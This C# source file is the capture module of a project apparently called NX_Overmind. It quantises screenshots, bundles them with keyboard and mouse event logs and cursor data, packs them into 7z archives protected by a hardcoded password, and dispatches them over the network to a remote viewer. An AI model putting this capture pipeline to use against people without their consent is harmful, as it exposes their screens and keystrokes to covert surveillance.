using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.Serialization.Formatters.Binary;

using NX.Hooks;
using NX.Collections;
using NX.Imaging;

namespace NX_Overmind.Actions
{
    public class CaptureManager
    {
        private Dictionary<Cursor, CursorType> _cursorTable = null;

        /*private Cursor[] CursorList()
        {
            // Make an array of all the types of cursors in Windows Forms.
            return new Cursor[] {
                Cursors.AppStarting,  Cursors.Arrow,      Cursors.Cross,        Cursors.Default, 
                Cursors.Hand,         Cursors.Help,       Cursors.HSplit,       Cursors.IBeam, 
                Cursors.No,           Cursors.NoMove2D,   Cursors.NoMoveHoriz,  Cursors.NoMoveVert,
                Cursors.PanEast,      Cursors.PanNE,      Cursors.PanNorth,     Cursors.PanNW, 
                Cursors.PanSE,        Cursors.PanSouth,   Cursors.PanSW,        Cursors.PanWest, 
                Cursors.SizeAll,      Cursors.SizeNESW,   Cursors.SizeNS,       Cursors.SizeNWSE,
                Cursors.SizeWE,       Cursors.UpArrow,    Cursors.VSplit,       Cursors.WaitCursor};
        }*/

        public enum CursorType : byte
        {            
            AppStarting,
            Arrow,
            Cross,
            Default,
            Hand,
            Help,
            HSplit,
            IBeam,
            No,
            NoMove2D,
            NoMoveHoriz,
            NoMoveVert,
            PanEast,
            PanNE,
            PanNorth,
            PanNW,
            PanSE,
            PanSouth,
            PanSW,
            PanWest,
            SizeAll,
            SizeNESW,
            SizeNS,
            SizeNWSE,
            SizeWE,
            UpArrow,
            VSplit,
            WaitCursor,
            
            Custom
        }
        /// <summary>
        /// Multi-threaded class to queue up 7z tasks
        /// </summary>
        private class BufferedOperator
        {
            /// <summary>
            /// Operation completed delegate
            /// </summary>
            /// <param name="owner">Sender's/Client's/Owner's Id</param>
            /// <param name="e">Event options</param>
            /// <param name="errorOccured">Whether error occurred in opertaion</param>
            public delegate void BufferedOperationCompleteHandler(int owner, CompressionEventArgs e, bool errorOccured);            
            public event BufferedOperationCompleteHandler OnComplete = null;            
            private readonly string _fileSecurityPassword = "H^$htA84s#|3";

            /// <summary>
            /// Entity of the buffered task queue
            /// </summary>
            private class BufferedTask
            {
                public int Owner;
                public DisposableDirectory Directory;
                public string[] Files;
                public bool Compress;

                /// <summary>
                /// Constructor
                /// </summary>
                /// <param name="owner">Owner's Id</param>
                /// <param name="compress">Compress or extract operation</param>
                /// <param name="ddir">Instance of DisposableDirectory holding the files</param>
                /// <param name="files">List of files to be compressed</param>
                public BufferedTask(int owner, bool compress, DisposableDirectory ddir, string[] files)
                {
                    this.Owner = owner;
                    this.Compress = compress;
                    this.Directory = ddir;
                    this.Files = files;
                }
            }

            /// <summary>
            /// Lock for inter-thread synchronization
            /// </summary>
            private readonly object _lock = new object();
            private Thread _performer = null;
            private Queue<BufferedTask> _bufferQueue = null;
            private int _owner = 0;

            /// <summary>
            /// Constructor
            /// </summary>
            public BufferedOperator(string fileSecurityPassword)
            {
                this._fileSecurityPassword = fileSecurityPassword;
                this._bufferQueue = new Queue<BufferedTask>();
            }

            /// <summary>
            /// Adds a task to the queue
            /// </summary>
            /// <param name="owner">Owner's Id</param>
            /// <param name="compress">Compress/Extract</param>
            /// <param name="ddir">Disposable directory containing the files</param>
            /// <param name="files">List of files to be compressed</param>
            public void AddTask(int owner, bool compress, DisposableDirectory ddir, string[] files)
            {
                lock (this._lock)
                {
                    this._bufferQueue.Enqueue(new BufferedTask(owner, compress, ddir, files));
                }
                this._performer = new Thread(new ThreadStart(this.PerformTask));
                this._performer.Name = "BufferedTaskAdd";
                this._performer.Start();
            }

            /// <summary>
            /// Thread of execution to perform a task
            /// </summary>
            private void PerformTask()
            {
                lock (this._lock)
                {
                    while (this._bufferQueue.Count != 0)
                    {
                        // Perform task
                        BufferedTask task = this._bufferQueue.Dequeue();
                        this._owner = task.Owner;
                        Compression7z cmp = new Compression7z();
                        cmp.OnComplete += new Compression7z.ProcessEventHandler(cmp_OnComplete);
                        if (task.Compress)
                            cmp.CompressFiles(true, task.Files[0], Compression7z.Type._7z, Compression7z.Compression.Ultra, task.Files, null, this._fileSecurityPassword);
                        else
                            cmp.ExtractFile(true, task.Files[0], Compression7z.Type._7z, Compression7z.Compression.Ultra, this._fileSecurityPassword);

                        // Dispose directory
                        task.Directory.Dispose();
                    }
                }
            }

            /// <summary>
            /// Callback for 7z task completed
            /// </summary>
            /// <param name="e">Event options</param>
            /// <param name="errorOccured">If error occurred</param>
            void cmp_OnComplete(CompressionEventArgs e, bool errorOccured)
            {
                if (this.OnComplete != null)
                    this.OnComplete(this._owner, e, errorOccured);
            }
        }

        /// <summary>
        /// Dispatch data over the network
        /// </summary>
        public event ActionCenter.ActionCenterInternalEventHandler DispatchData = null;
        /// <summary>
        /// Receive Debug messages
        /// </summary>
        public event ActionCenter.DebugEventHandler DebugEvent = null;        
        /// <summary>
        /// Capture data is recevied over the network
        /// </summary>
        public event ActionCenter.CaptureEventHandler ReceivedCapture = null;

        public delegate void CaptureCursorEventHandler(int owner, System.Windows.Forms.Cursor cursor, int xHotSpot, int yHotSpot);
        public event CaptureCursorEventHandler ReceivedCursor = null;

        private DisposableDirectory _encodeDisposeDir = new DisposableDirectory();      // Directory holding files to be encoded
        private DisposableDirectory _decodeDisposeDir = null;                           // Directory created temporarily to extract files to
        private Queue<string> _bufferCompressionQueue = new Queue<string>();            // Holds the list of files to be compressed
        private BufferedOperator _bufferedOperator = null;                              // Manages the 7z operations for compressing & extracting files
        
        public float CaptureShrinkFactor { get; set; }                                  // Image shrink factor
        public int CaptureBufferCount { get; set; }                                     // Buffer Size
        public int CaptureInterval { get; set; }                                        // Screenshot interval
        public int CaptureQuantizePalette { get; set; }                                 // Palette entries
        public byte CaptureQuantizeDepth { get; set; }                                  // Bit-depth
        
        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="fileSecurityPassword">Password to encrypt buffered files with</param>
        /// <param name="dispatchData">Method to handle dispatch of data over the network</param>
        public CaptureManager(string fileSecurityPassword, ActionCenter.ActionCenterInternalEventHandler dispatchData)
        {
            this._cursorTable = new Dictionary<Cursor, CursorType>();
            this._cursorTable.Add(Cursors.AppStarting, CursorType.AppStarting);
            this._cursorTable.Add(Cursors.Arrow, CursorType.Arrow);
            this._cursorTable.Add(Cursors.Cross, CursorType.Cross);
            //this._cursorTable.Add(Cursors.Default, CursorType.Default);
            this._cursorTable.Add(Cursors.Hand, CursorType.Hand);
            this._cursorTable.Add(Cursors.Help, CursorType.Help);
            this._cursorTable.Add(Cursors.HSplit, CursorType.HSplit);
            this._cursorTable.Add(Cursors.IBeam, CursorType.IBeam);
            this._cursorTable.Add(Cursors.No, CursorType.No);
            this._cursorTable.Add(Cursors.NoMove2D, CursorType.NoMove2D);
            this._cursorTable.Add(Cursors.NoMoveHoriz, CursorType.NoMoveHoriz);
            this._cursorTable.Add(Cursors.NoMoveVert, CursorType.NoMoveVert);
            this._cursorTable.Add(Cursors.PanEast, CursorType.PanEast);
            this._cursorTable.Add(Cursors.PanNE, CursorType.PanNE);
            this._cursorTable.Add(Cursors.PanNorth, CursorType.PanNorth);
            this._cursorTable.Add(Cursors.PanNW, CursorType.PanNW);
            this._cursorTable.Add(Cursors.PanSE, CursorType.PanSE);
            this._cursorTable.Add(Cursors.PanSouth, CursorType.PanSouth);
            this._cursorTable.Add(Cursors.PanSW, CursorType.PanSW);
            this._cursorTable.Add(Cursors.PanWest, CursorType.PanWest);
            this._cursorTable.Add(Cursors.SizeAll, CursorType.SizeAll);
            this._cursorTable.Add(Cursors.SizeNESW, CursorType.SizeNESW);
            this._cursorTable.Add(Cursors.SizeNS, CursorType.SizeNS);
            this._cursorTable.Add(Cursors.SizeNWSE, CursorType.SizeNWSE);
            this._cursorTable.Add(Cursors.SizeWE, CursorType.SizeWE);
            this._cursorTable.Add(Cursors.UpArrow, CursorType.UpArrow);
            this._cursorTable.Add(Cursors.VSplit, CursorType.VSplit);
            this._cursorTable.Add(Cursors.WaitCursor, CursorType.WaitCursor);

            this._bufferedOperator = new BufferedOperator(fileSecurityPassword);

            this.CaptureQuantizePalette = 256;
            this.CaptureQuantizeDepth = 8;
            
            this.CaptureShrinkFactor = 0.4f;
            this.CaptureBufferCount = 10;
            this.CaptureInterval = 500;

            this.DispatchData = dispatchData;
            this._bufferedOperator.OnComplete += new BufferedOperator.BufferedOperationCompleteHandler(cmp_OnComplete);
            //System.Diagnostics.Trace.WriteLine("New encodeDDir: " + this._encodeDisposeDir);
        }

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="fileSecurityPassword">Password to encrypt buffered files with</param>
        /// <param name="dispatchData">Method to handle dispatch of data over the network.</param>
        /// <param name="debugEvent">Method to output debug messages. (Testing phase)</param>               
        public CaptureManager(string fileSecurityPassword, ActionCenter.ActionCenterInternalEventHandler dispatchData, ActionCenter.DebugEventHandler debugEvent)
            :this(fileSecurityPassword, dispatchData)
        {
            this.DebugEvent = debugEvent;
        }

        /// <summary>
        /// Gets the quantizer used my the manager. Override to use a different quantizer
        /// </summary>
        /// <returns>A Quantizer object</returns>
        protected Quantizer GetQuantizer()
        {
            return new OctreeQuantizer(this.CaptureQuantizePalette, this.CaptureQuantizeDepth);
        }

        public void EncodeCaptureCursor(int id, IntPtr hCursor)
        {
            
            System.IO.MemoryStream ms = new MemoryStream();
            Cursor cur = new Cursor(hCursor);
            CursorType ct = CursorType.Custom;
            try
            {
                ct = this._cursorTable[cur];

            }
            catch (Exception) { }
            ms.WriteByte((byte)ct);
            if (ct == CursorType.Custom)
                Icon.FromHandle(hCursor).Save(ms);
            /*string _t = "Custom";
            try
            {
                _t = cur.ToString();
            }
            catch (Exception) { }
            string l = string.Format("Writing cursor #{0} -> {1} :: {2} :: {3} = {4}", hCursor.ToInt32(), Cursor.Current.Handle.ToInt32(), Cursor.Current, _t, ct);
            Log.WriteLine(l);
            System.Diagnostics.Trace.WriteLine(l);*/
            this.DispatchData(id, ActionCenter.ActionType.CaptureCursor, ms.ToArray());
        }
        
        public Cursor CreateCursor(Bitmap bmp, int xHotSpot, int yHotSpot)
        {
            Cursor c = null;
            IntPtr ptr = bmp.GetHicon();
            NX.WinApi.USER32.ICONINFO ic;
            NX.WinApi.USER32.GetIconInfo(ptr, out ic);
            ic.xHotspot = xHotSpot;
            ic.yHotspot = yHotSpot;
            ic.fIcon = false;

            ptr = NX.WinApi.USER32.CreateIconIndirect(ref ic);
            c = new Cursor(ptr);
            NX.WinApi.USER32.DeleteObject(ptr);

            return c;
        }

        public void DecodeCaptureCursor(int owner, byte[] data)
        {
            if (this.ReceivedCursor != null)
            {
                System.Windows.Forms.Cursor c = null;
                MemoryStream ms = new MemoryStream(data);
                CursorType ct = (CursorType)ms.ReadByte();
                if ( ct == CursorType.Custom)
                {
                    c = this.CreateCursor(new Icon(ms).ToBitmap(), 0, 0);                    
                }
                else
                {
                    //byte[] b = new byte[(ms.Length - ms.Position)];
                    //ms.Read(b,0, b.Length);
                    foreach (KeyValuePair<Cursor, CursorType> kv in this._cursorTable)
                    {
                        if (kv.Value == ct)
                        {
                            c = kv.Key;
                            break;
                        }
                    }
                    
                }
                this.ReceivedCursor(owner, c, 0, 0);//xH, yH);
            }
        }

        /// <summary>
        /// Encodes capture quality info to be sent over the network
        /// </summary>
        /// <param name="id">Client Id</param>
        public void EncodeCaptureQualityInfo(int id)
        {
            using(System.IO.MemoryStream ms = new MemoryStream())
            {                
                ms.WriteByte((byte)(this.CaptureShrinkFactor*100));
                ms.WriteByte((byte)this.CaptureQuantizeDepth);
                byte[] t = BitConverter.GetBytes(this.CaptureQuantizePalette);
                ms.Write(t, 0, t.Length);
                this.DispatchData(id, ActionCenter.ActionType.CaptureQuality, ms.ToArray());
            }
        }

        /// <summary>
        /// Decodes and assigns the capture quality paramters recevied over the network
        /// </summary>
        /// <param name="data">Data received over the network</param>
        public void DecodeCaptureQualityInfo(byte[] data)
        {
            this.CaptureShrinkFactor = data[0] * 0.01f;
            this.CaptureQuantizeDepth = data[1];
            this.CaptureQuantizePalette = BitConverter.ToInt32(data, 2);
        }

        /// <summary>
        /// Encodes the captures into a single packet and prepares for it's transmission
        /// </summary>
        /// <param name="id">Client Id</param>
        /// <param name="screenImg">Screenshot</param>
        /// <param name="logStream">Key & Mouse event log stream</param>
        /// <param name="isSingleCapture">Live stream or buffered stream</param>
        public void EncodeCapture(int id, Bitmap screenImg, Stream logStream, bool isSingleCapture)
        {
            Quantizer oq = this.GetQuantizer();//new OctreeQuantizer(this.CaptureQuantizePalette, this.CaptureQuantizeDepth);
            screenImg = oq.Quantize(ScreenSnap.ShrinkBitmap(screenImg, this.CaptureShrinkFactor));
            this.EncodeCapture(id, new CapturePacket(ScreenSnap.SnapshotToStream(screenImg, System.Drawing.Imaging.ImageFormat.Png), logStream), isSingleCapture);
        }

        /// <summary>
        /// Encodes/Buffers the capture packet and prepares for it's transmission
        /// </summary>
        /// <param name="id">Client Id</param>
        /// <param name="cPacket">Capture packet containing encapsulated screen & event logs</param>
        /// <param name="isSingleCapture">Live stream or buffered stream</param>
        public void EncodeCapture(int id, CapturePacket cPacket, bool isSingleCapture)
        {
            if (isSingleCapture)
            {
                this.DispatchData(id, ActionCenter.ActionType.CaptureLive, cPacket.Encode().ToArray());
            }
            else
            {
                cPacket.ParentDirectory = this._encodeDisposeDir.DirectoryPath;
                this._bufferCompressionQueue.Enqueue(cPacket.WriteEncoded(null));

                if (this._bufferCompressionQueue.Count == this.CaptureBufferCount)     // Compress and transmit if buffer limit reached
                {
                    this._bufferedOperator.AddTask(0, true, this._encodeDisposeDir, this._bufferCompressionQueue.ToArray());
                    // Create fresh queue
                    this._encodeDisposeDir = new DisposableDirectory();
                    //this.DebugEvent("New encodeDDir: " + this._encodeDisposeDir);                    
                    this._bufferCompressionQueue = new Queue<string>();
                }
            }
        }

        /// <summary>
        /// Decodes the capture data received over the network stream
        /// </summary>
        /// <param name="owner">Sender's Id</param>
        /// <param name="bytes">Data bytes</param>
        /// <param name="isSingleCapture">Live stream or buffered stream</param>
        public void DecodeCapture(int owner, byte[] bytes, bool isSingleCapture)
        {
            if (isSingleCapture)
            {
                CapturePacket cp = new CapturePacket();
                cp.Decode(new MemoryStream(bytes));
                if (this.ReceivedCapture != null)
                    this.ReceivedCapture(owner, (cp.ScreenShot.Length != 0) ? Image.FromStream(cp.ScreenShot) : null, HookEventHelper.StreamToHookEvents(cp.Log));
            }
            else
            {                     
                this._decodeDisposeDir = new DisposableDirectory();
                //this.DebugEvent("New decodeDDir: " + this._decodeDisposeDir);
                string fileName = Path.Combine(this._decodeDisposeDir.DirectoryPath, Path.GetRandomFileName()) + ".7z";
                File.WriteAllBytes(fileName, bytes);                                                                // Write file bytes to disk
                this._bufferedOperator.AddTask(owner, false, this._decodeDisposeDir, new string[] { fileName });    // Queue extraction task
                //this.DebugEvent("Extract: " + fileName);                
            }
        }

        /// <summary>
        /// Callback on 7z task completed. Dispatches final compressed data bytes / Parses the extracted received data files
        /// </summary>
        /// <param name="owner">Sender's Id</param>
        /// <param name="e">Event options</param>
        /// <param name="errorOccured">Whether error occurred in opertaion</param>
        private void cmp_OnComplete(int owner, CompressionEventArgs e, bool errorOccured)
        {
            //this.DebugEvent("7z: " + e.Operation.ToString() + ", " + errorOccured);
            if (e.Operation == NX.Collections.Compression7z.Action.Compress)
            {
                if (!errorOccured && File.Exists(e.TargetFile))
                    this.DispatchData(owner, ActionCenter.ActionType.CaptureStream, File.ReadAllBytes(e.TargetFile + ".7z"));                
            }
            else
            {
                if (!errorOccured)
                {
                    File.Delete(e.TargetFile);
                    //this.DebugEvent("Checking files in: " + Directory.GetParent(e.TargetFile).FullName);
                    foreach (string f in Directory.GetFiles(Directory.GetParent(e.TargetFile).FullName))
                    {
                        CapturePacket cp = new CapturePacket();
                        cp.ReadDecoded(f);
                        if (this.ReceivedCapture != null)
                            this.ReceivedCapture(owner, (cp.ScreenShot.Length != 0) ? Image.FromStream(cp.ScreenShot) : null, HookEventHelper.StreamToHookEvents(cp.Log));
                    }
                }
                //this._decodeDisposeDir.Dispose();
            }
        }             
    }
}
